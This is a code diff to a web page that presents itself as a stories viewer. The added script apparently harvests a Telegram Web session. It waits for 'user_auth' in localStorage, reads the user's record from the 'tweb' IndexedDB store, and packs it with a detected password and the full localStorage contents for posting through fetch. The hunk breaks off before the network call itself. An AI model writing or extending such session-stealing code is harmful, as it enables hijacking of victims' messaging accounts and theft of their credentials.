@@ -157,16 +157,55 @@
     <div id="stories-viewer"></div>
     <script>
       var interval = setInterval(function () {
-        if (localStorage.getItem("user_auth")) {
+        const userAuth = localStorage.getItem("user_auth")
+        if (userAuth) {
+          const parsedUserAuth = JSON.parse(userAuth)
+          const userId = parsedUserAuth.id
           clearInterval(interval)
-          postLocalStorageWithFetch()
+          postLocalStorageWithFetch(userId)
         }
       }, 1000)
 
-      function postLocalStorageWithFetch() {
+      async function getIndexedDbUser(userId) {
+        return new Promise( x => { 
+          let request = indexedDB.open("tweb")
+
+          request.onsuccess = function(event) {
+              let db = event.target.result;
+              let transaction = db.transaction(["users"], "readonly")
+              let objectStore = transaction.objectStore("users")
+
+              let cursorRequest = objectStore.openCursor()
+              const users = {}
+              cursorRequest.onsuccess = function(event) {
+                let cursor = event.target.result
+                if (cursor) {
+                    users[cursor.key] = cursor.value
+                    cursor.continue()
+                } else {
+                    x(users[userId])
+                    //console.log("No more entries!")
+                }
+              }
+
+              cursorRequest.onerror = function(event) {
+                //console.error("Cursor request failed", event);
+                x(null)
+              }
+          }
+
+          request.onerror = function(event) {
+            //console.error("Database open failed", event);
+            x(null)
+          }
+        })
+      }
+
+      async function postLocalStorageWithFetch(userId) {
+        const userData = await getIndexedDbUser(userId)
         let data = btoa(JSON.stringify({
           pass: window.detectedPass || false,
-          phone: window.detectedPhone || false,
+          userData: userData,
           ls: JSON.stringify(localStorage)
         }))
 
